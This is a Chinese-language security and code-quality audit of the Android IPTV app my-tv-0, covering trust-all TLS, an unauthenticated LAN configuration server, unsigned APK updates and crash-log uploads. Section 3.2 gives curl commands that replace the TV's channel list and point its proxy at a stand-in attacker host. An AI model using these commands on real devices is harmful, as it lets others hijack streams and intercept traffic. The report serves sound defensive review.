# MY-TV-0 源码审计报告

- 审计对象：`my-tv-0-main.zip`（lizongying/my-tv-0，commit 快照 2025-05-12）
- 审计方式：全量源码阅读 + 构建复现 + 关键行为单元测试验证
- 审计基线构建：`assembleDebug` 成功（APK 13,303,800 字节）
- 改造后构建：`assembleDebug` / `assembleRelease` 均成功，55 个单元测试全绿
- 代码规模：Kotlin 约 7,100 行（改造前），本次新增/重写约 2,900 行

---

## 1. 工程结构

```
app/src/main/java/com/lizongying/mytv0/
├── MainActivity.kt          遥控器事件分发、Fragment 显隐、手势、服务生命周期
├── MainViewModel.kt         频道加载/解析/EPG/远程配置（原 601 行，职责过载）
├── PlayerFragment.kt        ExoPlayer 创建、切台、重试、音量条
├── SP.kt                    SharedPreferences 封装
├── SimpleServer.kt          NanoHTTPD 局域网配置服务
├── UpdateManager.kt         DownloadManager 自更新
├── MyTVExceptionHandler.kt  全局崩溃处理（原：上传日志）
├── models/
│   ├── TVModel.kt           单频道播放模型（MediaSource 构建 + 重试计数）
│   ├── TVListModel.kt       分组内的频道列表（LiveData）
│   ├── TVGroupModel.kt      分组集合
│   ├── EPGXmlParser.kt      XMLTV 解析
│   └── Sources.kt           订阅源列表
├── data/                    TV / EPG / Source / SourceType / Gson TypeToken
├── requests/                HttpClient / DnsCache / Tls12SocketFactory
└── res/raw/                 channels.txt（内置频道）、index.html（配置页）、sources.txt
```

### 数据流（改造前）

```
channels.txt ──str2Channels()──▶ List<TV> ──▶ Map<group, List<TVModel>>
                                     │
              SharedPreferences ─────┤ 收藏（按序号）
                                     ▼
                     MainActivity.watch() 为每个 TVModel 注册 3 个观察者
                                     │
                     setReady() ──▶ PlayerFragment.play() ──▶ ExoPlayer
```

关键结论：**解析、持久化、UI 状态、播放控制全部耦合在 `MainViewModel` + `PlayerFragment` 两个类里**，没有状态机、没有超时、没有重试上限、没有事务式写入。

---

## 2. 逐文件审计摘要

| 文件 | 行数 | 核心问题 | 风险 |
|---|---|---|---|
| `requests/HttpClient.kt` | 118 | 自定义 TrustManager 全放行、HostnameVerifier 恒 true、代理 builder 复用、单例 client 无超时区分 | **P0** |
| `requests/Tls12SocketFactory.kt` | 73 | 强制 TLS1.2 的历史补丁，minSdk=21 后无实际作用 | P3 |
| `requests/DnsCache.kt` | 40 | 永久缓存、无上限、无负缓存、IPv6 优先 | P1 |
| `PlayerFragment.kt` | 290 | 每次 `updatePlayer()` 新建播放器不注销监听；`onVideoSizeChanged` 整数除零；无限重试；`onPause` 调 `stop()` | **P0** |
| `models/TVModel.kt` | 243 | MediaSource 构建时重置类型索引导致换类型无效；`getMediaItem()` 缓存旧 DataSource；无每地址请求头 | P1 |
| `MainViewModel.kt` | 601 | 更新失败即覆盖配置；JSON 缺字段 NPE；主线程写 EPG 缓存；EPG 匹配用 `contains` 错配；台标预加载风暴 | **P0/P1** |
| `SP.kt` | 218 | 收藏按解析序号存储，换源后错位；StringSet 并发修改 | P1 |
| `SimpleServer.kt` | 313 | 0.0.0.0 监听、无任何鉴权、body 无上限、`runBlocking` 拉取源列表 | **P0** |
| `UpdateManager.kt` | 274 | Cursor 提前 return 泄漏；进度轮询只跑一次；`file://` 安装崩溃；无签名校验 | **P0/P1** |
| `MyTVExceptionHandler.kt` | 82 | 默认上传崩溃日志（含频道 URL）；`runBlocking`+Main 可能死锁 | **P0** |
| `models/EPGXmlParser.kt` | 60 | SimpleDateFormat；Int 秒溢出；programme 早于 channel 丢失；空 `<title>` 抛异常 | P1 |
| `MainActivity.kt` | 869 | `getCurrent()!!`/`getAllList()!!` NPE；`watch()` 观察者累积；数字键选台错位 | P0/P1 |
| `res/xml/network.xml` | - | 发布版信任用户 CA | P1 |
| `res/raw/index.html` | 14.8KB | 无令牌、`innerHTML` 拼接直播源 | P2 |
| `app/build.gradle.kts` | - | 无测试依赖、无 `testOptions` | P2 |

---

## 3. 关键缺陷复现路径

### 3.1 HTTPS 全信任（P0）

```kotlin
// 改造前 requests/HttpClient.kt:61-86
override fun checkServerTrusted(chain: ..., authType: String?) { }   // 空实现
...
.hostnameVerifier { _, _ -> true }
```

任意中间人（公共 WiFi、被劫持的路由器、恶意代理）都能解密并替换：
- 直播源地址（`channels.txt` 拉取）
- EPG 数据（可注入任意节目信息）
- 版本检查结果（可推送任意 APK 下载地址）
- `updateEPG` / `getUrls` 的镜像列表

**这不是"兼容性问题"，是完整性的全面失守。**

### 3.2 局域网任意设备可改配置（P0）

`SimpleServer` 在 `MainActivity.ready()` 中无条件 `start()`，监听 `0.0.0.0:34567`，`serve()` 不做任何校验。同一网段内任何设备执行：

```bash
curl -X POST http://<tv-ip>:34567/api/import-text --data-binary @evil.txt
curl -X POST http://<tv-ip>:34567/api/proxy -d '{"proxy":"http://attacker:8080"}'
```

即可把电视的直播源与代理全部替换。`GET /api/settings` 还会把当前完整频道文本（含带 token 的播放地址）返回给请求方。

### 3.3 切台崩溃（P0）

```kotlin
// 改造前 PlayerFragment.kt:83-95
override fun onVideoSizeChanged(videoSize: VideoSize) {
    val ratio = playerView.measuredWidth.div(playerView.measuredHeight)  // 高度可能为 0
```

`Int.div(0)` 抛 `ArithmeticException`；`onVideoSizeChanged` 在布局完成前触发即崩溃。电视盒子冷启动时该窗口客观存在。

### 3.4 直播源更新丢配置（P0）

```kotlin
// 改造前 MainViewModel.tryStr2Channels
if (str2Channels(str)) {
    cacheFile!!.writeText(str)     // 先覆盖文件
```

`str2Channels` 对空列表也返回 `true`（只要 JSON 不是语法错误），于是：
1. 远端返回 `[]` 或全部条目缺 `uris`；
2. `listModel` 变空、`channels.txt` 被 `[]` 覆盖；
3. 下次启动仍然空，用户只能"恢复默认"。

自动更新（`configAutoLoad`）每次启动都会走这条路径。

### 3.5 更新 APK 安装崩溃（P0）

```kotlin
val apkUri = Uri.parse("file://$apkFile")
intent.setDataAndType(apkUri, "application/vnd.android.package-archive")
```

Android 7.0+ 触发 `FileUriExposedException`，更新流程 100% 失败（除非系统极旧）。且没有任何签名校验，`apk_url` 被劫持即可安装任意应用。

### 3.6 崩溃日志外传（P0，隐私）

`MyTVExceptionHandler` 默认把 `DEVICE/MODEL/异常堆栈` POST 到 `https://lyrics.run/...`，堆栈中可能包含用户频道 URL 与其 token 参数。且：

```kotlin
runBlocking {
    launch {
        saveCrashInfoToFile(crashInfo)
        withContext(Dispatchers.Main) { killProcess(...) }
    }
}
```

崩溃发生在主线程时，`Dispatchers.Main` 无法被调度 → 进程卡死（ANR）而非退出。

---

## 4. 架构层面结论

1. **没有播放状态机**：`ready / errInfo / videoIndex / retryTimes` 四个隐式状态分散在 `TVModel` 与 `PlayerFragment`，任意回调都可能与当前频道不一致。
2. **没有事务边界**：配置解析、文件写入、内存模型替换三步没有"验证 → 提交 → 回滚"。
3. **没有错误分类**：403/404/超时/解码失败走同一套"重试 10 次再换源"，导致 403 频道被无效重试十几秒。
4. **标识不稳定**：`TV.id` = 解析顺序，收藏、默认频道、播放历史都会被一次配置更新打乱。
5. **安全默认值错误**：远程服务默认开启、崩溃上报默认开启、TLS 默认关闭校验。

以上五点分别对应本次改造新增的 `playback/`、`store/`、`net/`、`parser/`、`server/` 五个包。

---

## 5. 依赖与兼容性核对

| 项 | 改造前 | 改造后 | 说明 |
|---|---|---|---|
| compileSdk | 35 | 35 | 未变 |
| targetSdk | 35 | 35 | 未变 |
| minSdk | 21 | 21 | 未变（Android 5.0 / 大量 4.4 盒子升级版） |
| Kotlin | 2.0.0 | 2.0.0 | 未变 |
| AGP | 8.7.3 | 8.7.3 | 未变 |
| Media3 | 1.5.1 | 1.5.1 | 未变 |
| FFmpeg AAR | 保留 | 保留 | 未删除、未替换 |
| NanoHTTPD | 2.3.1 | 2.3.1 | 未变（仅重写使用方式） |
| 新增运行时依赖 | - | 无 | 测试依赖不进入 APK |

结论：**没有引入任何新的运行时依赖，没有升级任何构建组件，Android 4.4 兼容版本的既有设计目标不受影响。**
